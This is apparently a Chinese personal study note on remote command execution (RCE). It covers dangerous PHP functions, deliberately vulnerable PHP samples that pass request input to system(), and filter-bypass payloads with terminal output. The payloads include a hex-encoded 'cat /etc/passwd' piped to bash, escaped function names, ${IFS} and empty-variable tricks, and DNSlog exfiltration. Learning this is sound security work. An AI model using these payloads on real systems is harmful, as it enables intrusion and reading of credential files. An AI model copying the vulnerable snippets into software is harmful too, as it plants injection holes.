---
title: RCE
date: 2024年7月26日
updated: 2024年7月26日
tags:
  - 渗透
categories: 渗透
keywords:
description: rce

---
# rce

## 漏洞描述
rce是指服务器没有对执行的命令进行过滤，用户可以任意的调用系统命令

## 漏洞原理
应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用```system、exec、shell_exec、passthru、popen、proc_popen```等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行

## 漏洞危害

可以继承web服务器权限，反弹shell

## 产生原因

- 过滤不严
- 系统存在漏洞
- 第三方插件

## rce何代码执行的区别
- 代码执行：执行效果完全依赖于语言本身
- 命令执行：执行效果不受语言本身、命令本身的限制

## 常见的危险函数
```
1. php代码相关
  eval()
  assert()
  preg_replace
  call_user_func()
  call_user_func_array()
  create_function
  array_map()
2. 系统命令执行相关
  system()
  passthru()
  exec()
  pcntl_exec()
  shell_exec()
  popen()
  proc_open()
  `(反单引号)
  ob_start()
3. 特殊函数
  phpinfo()
  #这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息
  symlink()：
  #一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容
  getenv
  #获取一个环境变量的值
  putenv($a)
  #添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态
```

## 危险函数调用

### system
```system``` --执行外部程序并且显示输出

用法：```system(string $command,int &$return_var=?):string```

```
system:函数名字
string $command表示这个函数的第一个参数是一个string类型的字符串
&$return_var没有错，&表示的是这个参数是通过引用传递的
```

引用传递
就是通过引用传递函数可以让函数修改调用者传递进来的变量的值。
```简单的例子
<?php
// 定义一个函数，接受一个整数参数通过引用传递
function doubleValue(&$num) {
    $num *= 2; // 将传递进来的参数乘以2
}

// 定义一个变量
$value = 10;

// 调用函数，传递变量 $value 作为参数
doubleValue($value);

// 输出变量 $value 的值，应为原来的值乘以2
echo $value; // 输出 20
?>
```
在这个示例中，```doubleValue``` 函数接受一个参数 ```$num```，这个参数通过引用传递（使用 & 符号）。在函数内部，参数 ```$num``` 的值被乘以2。当在调用代码中将变量 ```$value``` 传递给函数时，函数修改了这个变量的值，使得最终输出结果为 20。


```system
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    $b = system($url, $a);
    echo $a.PHP_EOL;
    echo $b.PHP_EOL;
}
?>
```

这里调用system函数获取了url的数值进行,php_eol是换行符
```执行url=dir```
[![pkbTI41.png](https://s21.ax1x.com/2024/07/26/pkbTI41.png)](https://imgse.com/i/pkbTI41)

### passthru

```passthru``` -- 执行外部程序并且显示原始输出

用法：```passthru(string $command,int &$return_var=?):void```
```passthru
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    passthru($url,$a);
    echo $a.PHP_EOL;
}
?>
```
执行命令```?url=dir > 22.txt```

[![pkbTT9x.png](https://s21.ax1x.com/2024/07/26/pkbTT9x.png)](https://imgse.com/i/pkbTT9x)

### exec

```exec``` --执行一个外部程序

```exec(string $commadn,array &$output=?,int &$return_var=?):string```

```exec

<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo exec($url);
}
?>
```
```执行命令
?url=echo falgistrue > 222.txt
```

[![pkb798P.png](https://s21.ax1x.com/2024/07/26/pkb798P.png)](https://imgse.com/i/pkb798P)


### shell_exec

```shell_exec(string $cmd ):string```

```
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo shell_exec($url);
}
?>
```

```执行代码
echo falgistrue > 221.txt
```

[![pkb7GVJ.png](https://s21.ax1x.com/2024/07/26/pkb7GVJ.png)](https://imgse.com/i/pkb7GVJ)


### 反引号
```
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo `$url`;
}
?>
```

## OS命令执行

### windows支持的管道符
```
|

```

直接执行后面的语句，不管前面的是否可以

[![pkbH3SP.png](https://s21.ax1x.com/2024/07/26/pkbH3SP.png)](https://imgse.com/i/pkbH3SP)


```
||
```

前面的语句执行错误才可以执行后面的

```
&
```

如果前面的语句为假则直接执行后面的语句，前面的语句可真可假

```
&&
```

如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句

### linux支持的管道符
```
;
```

执行完前面的执行后面的

```

|,||,&,&&
```


等于windows的

### Java

Java SE 中，存在Runtime 类，在该类中提供了exec 方法用以在单独的进程中执行指定的字符串命令，像JSP、Servlet、 Struts、 Spring、 Hibernate 等技术一般执行外部程序都会调用此方法（或者使用ProcessBuilder类，但较少）

```
import java. io.InputStream;  //导包操作
import java. io.InputStreamReader;
import java. io.BufferedReader;
public class RuntimeTest{
  public static void main (String args []) throws Exception{
    if (args.length==0) {
      System.exit(1);  //没有参数就退出
    }
    String command = args[0];
    Runtime run = Runtime.getRuntime();
    Process pro = run. exec(command);  //执行命令
    InputStreamReader in = new InputStreamReader(pro.getInputStream());
    BufferedReader buff = new BufferedReader(in);
    for(String temp = buff.readLine();temp!=null;temp=buff.readLine()){
      System.out.println(temp);  //输出结果
    }
  buff .close();
  in.close();
  }
}

```

https://i-blog.csdnimg.cn/blog_migrate/09d9415acac67ac95c041a356d92fc63.png
(先拿别人的图凑数(bushi))

### python

```
exec(string)		# Python代码的动态执行
eval(string)		# 返回表达式或代码对象的值
execfile(string)	# 从一个文件中读取和执行Python脚本
input(string)		# Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入
compile(string)		# 将源字符串编译为可执行对象

```

命令执行
```
system()		# 执行系统指令
popen()			# popen()方法用于从一个命令打开一个管道
subprocess.call # 执行由参数提供的命令
spawn 			# 执行命令

```

## 绕过

https://blog.csdn.net/qq_41315957/article/details/118855865

### 编码绕过

如果过滤了一些分隔符，可以尝试讲分隔符编码(url,base64)绕过

### 八进制绕过
```
$(printf "\154\163")

```


就是ls

### 十六进制
```
echo "636174202F6574632F706173737764" | xxd -r -p|bash
```


```
┌──(kali㉿kali)-[~]
└─$ echo "636174202F6574632F706173737764" | xxd -r -p|bash
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
···太长了后面省略了
```
十六进制还有个字符串过滤的
```
┌──(kali㉿kali)-[~]
└─$ php -r '"\x73\x79\x73\x74\x65\x6d"("cat /etc/passwd");'
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```

### 空格绕过
linux内置的分隔符${IFS}，$IFS，$IFS$9

或者利用重定向符<>

###  +，>过滤

对于 >,+ 等 符号的过滤 ，```$PS2变量为>，$PS4变量则为+```


### 关键字绕过
```
通过拆分命令达到绕过的效果：a=l;b=s;$a$b
空变量绕过：cat fl${x}ag cat tes$(z)t/flag
控制环境变量绕过：
先利用echo $PATH得到环境变量 => "/usr/local/….blablabla”
接着利用echo ${#PATH}得到长度
然后要哪个字符截取哪个字符就行
${PATH:0:1} => ‘/’
${PATH:1:1} => ‘u’
${PATH:0:4} => ‘/usr’
空值绕过：cat fl""ag cat fl''ag cat "fl""ag"
反斜杠绕过：ca\t flag l\s

```
``` PATH
┌──(kali㉿kali)-[~]
└─$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools

┌──(kali㉿kali)-[~]
└─$ echo ${PATH}
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools

┌──(kali㉿kali)-[~]
└─$ echo ${PATH:1:1}
u

┌──(kali㉿kali)-[~]
└─$ echo ${PATH:0:5}
/usr/
```

### 空变量
$*和$@，$x(x 代表 1-9)，${x}(x>=10)：比如ca${21}t a.txt表示cat a.txt
在没有传入参数的情况下，这些特殊字符默认为空，如下:
```
wh$1oami

who$@ami

whoa$*mi
```
```
┌──(kali㉿kali)-[~]
└─$ cat 1.txt
$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41

┌──(kali㉿kali)-[~]
└─$ ca{123}t 1.txt
ca{123}t：未找到命令

┌──(kali㉿kali)-[~]
└─$ ca${123}t 1.txt
$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41
```

### 花括号
在Linux bash中还可以使用```{OS_COMMAND,ARGUMENT}```来执行系统命令```{cat,flag}```

但是我反复尝试都不行，也不知道是为啥
```
┌──(kali㉿kali)-[~]
└─$ {cat,1.txt}
cat,1.txt：未找到命令

┌──(kali㉿kali)-[~]
└─$ ${cat,1.txt}
zsh: bad substitution

┌──(kali㉿kali)-[~]
└─$ ${cat,/etc/passwd}
zsh: bad substitution

┌──(kali㉿kali)-[~]
└─$ {cat,/etc/passwd}
zsh: 没有那个文件或目录: cat,/etc/passwd

┌──(kali㉿kali)-[~]
└─$ {cat,/etc/passwd}
zsh: 没有那个文件或目录: cat,/etc/passwd
```

### 无回显的命令执行
curl将命令的结果输出到访问的url中，可以在服务器中发现
（还没尝试，应该可行）



[![pkbHlWt.png](https://s21.ax1x.com/2024/07/26/pkbHlWt.png)](https://imgse.com/i/pkbHlWt)


### get_defined_functions

```php -r 'print_r(get_defined_functions()["internal"]);' | grep 'system'```

这个PHP系统函数会返回一个多维数组，该数组包含一个所有已定义函数（包括内部函数和用户定义函数）列表。内部函数可以通过$arr["internal"]来表示，用户定义的函数可以使用$arr["user"]来表示。

用法
```
┌──(kali㉿kali)-[~]
└─$ php -r 'print_r(get_defined_functions()["internal"]);' | grep 'system'
    [562] => system

┌──(kali㉿kali)-[~]
└─$ php -r 'print_r(get_defined_functions()["internal"]["562"]("whoami"));'
kali
kali
```
### 字符数组
PHP中的每个字符串都可视为一个字符数组，并且可以通过语法$string[2]或 $string[-3]来引用单个字符，这同时也是另一种绕过安全规则的方法
例如，仅仅使用字符串$a="elmsty/ ";，我就可以组成命令执行语句system("ls /tmp");
```
┌──(kali㉿kali)-[~]
└─$ php -r '$s="elmsty/ "; ($s[3].$s[5].$s[3].$s[4].$s[0].$s[2])($s[1].$s[3].$s[-1].$s[-2]."tmp");'
ssh-IsnyfG8atHyV
systemd-private-4ca3281a17864fe887e7753be4b15603-colord.service-LL67Bu
systemd-private-4ca3281a17864fe887e7753be4b15603-haveged.service-mIMcQ1
systemd-private-4ca3281a17864fe887e7753be4b15603-ModemManager.service-Ht7xiS
systemd-private-4ca3281a17864fe887e7753be4b15603-polkit.service-Zscji7
systemd-private-4ca3281a17864fe887e7753be4b15603-systemd-logind.service-MwIoxj
systemd-private-4ca3281a17864fe887e7753be4b15603-systemd-timesyncd.service-qVL8zc
systemd-private-4ca3281a17864fe887e7753be4b15603-upower.service-2qUlm5
VMwareDnD
vmware-root_620
```

### 引号逃逸


```$a = (string)foo;在这种情况下，变量$a就是字符串“foo”```

https://i-blog.csdnimg.cn/blog_migrate/e401020e7f9c2719f702aebd942af74f.png


[![pkbHgw4.png](https://s21.ax1x.com/2024/07/26/pkbHgw4.png)](https://imgse.com/i/pkbHgw4)


### DNSlog外带

[![pkbHWk9.png](https://s21.ax1x.com/2024/07/26/pkbHWk9.png)](https://imgse.com/i/pkbHWk9)

当你有一个二级域名，比如test.vernus.top当有主机风闻1111.test.vernus.top的时候，就会被记录下来解析请求，这里的话我们就可以将代码放到前面了


具体可以参考这个

https://www.cnblogs.com/hellobao/articles/17266933.html
